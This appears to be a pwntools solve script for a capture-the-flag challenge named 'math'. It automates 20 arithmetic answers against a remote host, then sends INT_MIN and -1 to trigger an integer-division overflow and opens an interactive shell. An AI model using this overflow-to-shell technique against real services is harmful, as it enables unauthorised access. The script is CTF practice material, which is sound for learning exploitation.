#!/usr/bin/env python3
from pwn import *
p = process('./math')
p = remote('10.212.27.23', 12138) 
context(os='linux', arch='amd64', log_level='debug')

for i in range(20):
    p.recvuntil('numberA = :')
    a = int(p.recvuntil('\n'))
    p.recvuntil('numberB = :')
    b = int(p.recvuntil('\n'))
    log.info('a: ' + str(a))
    log.info('b: ' + str(b))
    op =  p.recvuntil(':')
    op = chr(op[-4])
    log.info('op: ' + op)
    if op == "*":
        p.sendline(str(a*b))
    elif op == "+":
        p.sendline(str(a+b))
    else:
        p.sendline(str(a-b))

p.sendlineafter("number:", str(-2147483648) + " " + str(-1))

p.interactive()